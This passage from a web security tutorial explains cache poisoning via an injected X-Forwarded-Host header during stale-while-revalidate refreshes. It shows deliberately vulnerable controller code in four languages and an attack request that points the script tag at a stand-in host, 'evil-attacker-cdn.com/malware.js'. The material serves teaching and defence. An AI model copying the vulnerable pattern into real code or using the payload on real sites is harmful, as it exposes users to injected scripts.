        var assetHost = Request.Headers["X-Forwarded-Host"].FirstOrDefault() ?? Request.Host.Value;

        var html = $@"
            <!DOCTYPE html>
            <html>
            <head>
                <!-- [3] -->
                <script src='https://{assetHost}/assets/js/core-bundle.js'></script>
            </head>
            <body>
                <h1>Live Dashboard</h1>
                <div id='data-root'>Data loaded at {DateTime.UtcNow}</div>
            </body>
            </html>";

        // [4]
        Response.Headers.Add("Cache-Control", "public, s-maxage=60, stale-while-revalidate=3600");
        
        return Content(html, "text/html");
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Controller
public class SsrRenderingController {

    @GetMapping(value = "/public/dashboard", produces = MediaType.TEXT_HTML_VALUE)
    @ResponseBody
    public ResponseEntity<String> renderDashboard(HttpServletRequest request) {
        // [1]
        // [2]
        String assetHost = request.getHeader("X-Forwarded-Host");
        if (assetHost == null) assetHost = request.getServerName();

        // [3]
        String html = "<!DOCTYPE html>\n" +
                      "<html>\n" +
                      "<head>\n" +
                      "    <script src='https://" + assetHost + "/assets/js/core-bundle.js'></script>\n" +
                      "</head>\n" +
                      "<body>\n" +
                      "    <h1>Live Dashboard</h1>\n" +
                      "    <div id='data-root'>Data loaded at " + Instant.now().toString() + "</div>\n" +
                      "</body>\n" +
                      "</html>";

        // [4]
        return ResponseEntity.ok()
                .header("Cache-Control", "public, s-maxage=60, stale-while-revalidate=3600")
                .body(html);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SsrRenderingController extends Controller
{
    public function renderDashboard(Request $request)
    {
        // [1]
        // [2]
        $assetHost = $request->header('X-Forwarded-Host') ?? $request->getHost();

        // [3]
        $html = "
            <!DOCTYPE html>
            <html>
            <head>
                <script src='https://{$assetHost}/assets/js/core-bundle.js'></script>
            </head>
            <body>
                <h1>Live Dashboard</h1>
                <div id='data-root'>Data loaded at " . now() . "</div>
            </body>
            </html>";

        // [4]
        return response($html)
            ->header('Cache-Control', 'public, s-maxage=60, stale-while-revalidate=3600');
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/public/dashboard', (req, res) => {
    // [1]
    // [2]
    let assetHost = req.headers['x-forwarded-host'] || req.hostname;

    // [3]
    let html = `
        <!DOCTYPE html>
        <html>
        <head>
            <script src='https://${assetHost}/assets/js/core-bundle.js'></script>
        </head>
        <body>
            <h1>Live Dashboard</h1>
            <div id='data-root'>Data loaded at ${new Date().toISOString()}</div>
        </body>
        </html>`;

    // [4]
    res.setHeader('Cache-Control', 'public, s-maxage=60, stale-while-revalidate=3600');
    res.send(html);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture relies heavily on dynamic asset routing to support multi-region deployments and staging environments from a single codebase, \[2] The developer extracts the requested Host header to synthesize absolute URIs for critical JavaScript and CSS payload inclusions, \[3] The architecture interpolates the unverified header directly into the raw HTML DOM, \[4] The execution paradox. The endpoint leverages `stale-while-revalidate` caching. Standard vulnerability scanners inject `X-Forwarded-Host` and immediately check the synchronous HTTP response. Because the CDN serves the _cached_ content synchronously, the scanner observes no reflection and terminates the test. The true vulnerability executes entirely asynchronously in the background

```http
// 1. Attacker monitors the Cache-Control headers of the target application.
//    Cache-Control: public, s-maxage=60, stale-while-revalidate=3600
//    Age: 65

// 2. The Attacker realizes the cache has entered the 'stale' window. The next request will trigger SWR.
// 3. The Attacker sends the triggering request, injecting the poisoned routing header.

GET /public/dashboard HTTP/1.1
Host: www.enterprise.tld
X-Forwarded-Host: evil-attacker-cdn.com/malware.js?

// 4. The CDN instantly returns the SAFE, STALE HTML document to the attacker (Age: 65).
// 5. Asynchronously, the CDN edge worker initiates a background fetch to the backend SSR engine.
//    It explicitly passes the attacker's X-Forwarded-Host header.

// 6. The SSR Backend generates the new HTML:
//    <script src='https://evil-attacker-cdn.com/malware.js?/assets/js/core-bundle.js'></script>

// 7. The CDN receives the poisoned HTML and OVERWRITES the global cache.
// 8. Subsequent legitimate users browsing to www.enterprise.tld receive the poisoned cache, 
//    loading the attacker's external JavaScript into their browser session.
```
{% endstep %}

{% step %}
To maximize Core Web Vitals and ensure zero-latency page loads, frontend architects implemented `stale-while-revalidate` (SWR) caching protocols. This architecture fundamentally decoupled the client's synchronous HTTP response from the backend's rendering lifecycle. Developers erroneously assumed that context isolation was naturally enforced during asynchronous operations. By injecting a hostile routing header exactly when the cache expired into the 'stale' window, the attacker weaponized the CDN's background revalidation worker. The worker inherited the attacker's poisoned context and forwarded it to the backend rendering engine. The backend rendered the malicious HTML and returned it to the CDN, which obediently overwrote the authoritative cache tier. The vulnerability succeeded specifically because it incubated outside the observable synchronous request-response cycle, evading all traditional dynamic application security testing (DAST) scanners
{% endstep %}
{% endstepper %}

***

## Cheat Sheet

